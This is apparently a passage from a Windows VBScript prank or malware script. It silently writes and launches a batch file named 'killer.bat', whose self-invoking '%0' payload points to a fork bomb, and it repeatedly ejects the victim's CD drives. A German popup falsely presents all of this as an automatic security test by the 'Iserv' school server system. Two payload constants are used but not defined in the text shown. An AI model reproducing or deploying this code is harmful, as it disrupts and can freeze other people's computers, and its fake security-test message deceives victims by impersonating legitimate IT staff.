Const PAYLOAD3 = "%0" 
Const CHILD = "killer.bat"
Const REPEATER = 1
Const ForWriting = 2
Const Create = true

Dim u

Set oWMP = CreateObject("WMPlayer.OCX" )
Set colCDROMs = oWMP.cdromCollection
Set objFSO = Wscript.CreateObject("Scripting.FileSystemObject")
Set objFile = objFSO.OpenTextFile(CHILD, ForWriting, Create)

objFile.WriteLine PAYLOAD1
objFile.WriteLine PAYLOAD2
objFile.WriteLine PAYLOAD3
objFile.close
Set objFile = nothing
Set objFSO = nothing

CreateObject("Wscript.Shell").Run """" & CHILD & """", 0, False


repeat = 1
For x=0 to repeat
If colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject

CreateObject("WScript.Shell").Popup "Dies ist ein automatischer Sicherheitstest von Iserv",3,"HGW-Iserv (build2347)",64

Next
End If
Wscript.Sleep 100
If colCDROMs.Count >= 1 then
For i = 0 to colCDROMs.Count - 1
colCDROMs.Item(i).Eject
Next
End If
Next
